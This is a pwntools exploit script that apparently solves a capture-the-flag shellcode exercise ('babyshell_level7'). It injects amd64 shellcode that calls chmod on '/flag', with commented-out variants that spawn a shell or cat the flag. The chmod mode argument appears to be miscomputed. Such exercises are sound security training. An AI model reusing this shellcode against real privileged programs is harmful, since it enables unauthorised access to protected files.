#!/usr/bin/env python3
from pwn import *
import re

context.arch = 'amd64'
context.timeout = 3000000

# 1 Stackframe is 8 bytes (64bit)

# That is the extra layer:
# puts("Removing write permissions from first 4096 bytes of shellcode.\n");
#    assert(mprotect(shellcode_mem, 4096, PROT_READ|PROT_EXEC) == 0);

shellcode=f"""
mov rax, 0x67616c662f
push rax
mov rdi, rsp
mov rsi, {u32(b"0777")}
mov rax, SYS_chmod
syscall
"""
# both not working, how to prevent 48 opcode in 64 bit mode? 
#shellcode=pwnlib.shellcraft.i386.linux.cat("/flag")
#shellcode=pwnlib.shellcraft.amd64.linux.sh()
print(shellcode)
shellcode=(asm(shellcode))
#print(shellcode)


print('1', disasm(shellcode))

s = ssh(host="pwn")

shellcode=bytes(shellcode)
f = SSHPath('/tmp/shellcode', ssh=s)
f.touch()
f.write_bytes(shellcode)
print("length", len(shellcode))

p = s.process('cat /tmp/shellcode | /challenge/babyshell_level7', shell=True)
#r = p.recvuntil(b"Reading 0x2000 bytes from stdin.")
#print(r.decode())
#p.send(shellcode)
print(p.recvall().decode("UTF-8"))